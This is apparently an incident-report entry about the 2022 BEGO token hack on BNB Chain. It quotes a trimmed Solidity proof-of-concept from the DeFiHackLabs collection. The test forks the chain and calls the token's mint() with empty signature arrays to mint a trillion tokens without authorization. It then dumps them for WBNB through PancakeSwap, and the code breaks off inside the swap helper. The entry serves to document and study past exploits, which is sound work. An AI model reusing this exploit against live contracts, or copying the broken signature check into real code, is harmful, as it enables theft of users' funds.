# [?] BEGO - Incorrect signature verification

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BEGO
Published: 2022-10-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BEGO_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    BEGO20 constant BEGO_TOKEN = BEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 22_315_679);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB");
        vm.label(address(BEGO_TOKEN), "BEGO");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(0x88503F48e437a377f1aC2892cBB3a5b09949faDd, "WBNB_BEGO_PAIR");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );

        bytes32[] memory _r = new bytes32[](0);
        bytes32[] memory _s = new bytes32[](0);
        uint8[] memory _v = new uint8[](0);
        // Actual payload exploiting the vulnerability in the `mint()` function
        BEGO_TOKEN.mint(1_000_000_000_000 * 1e18, "t", address(this), _r, _s, _v);

        // Swap all minted BEGO to WBNB via PancakeSwap for profit dumping the price
        _BEGOToWBNB();

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );
    }

    /**
     * Auxiliary function to swap all BEGO to WBNB
     */
    function _BEGOToWBNB() internal {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BEGO_exp.sol_
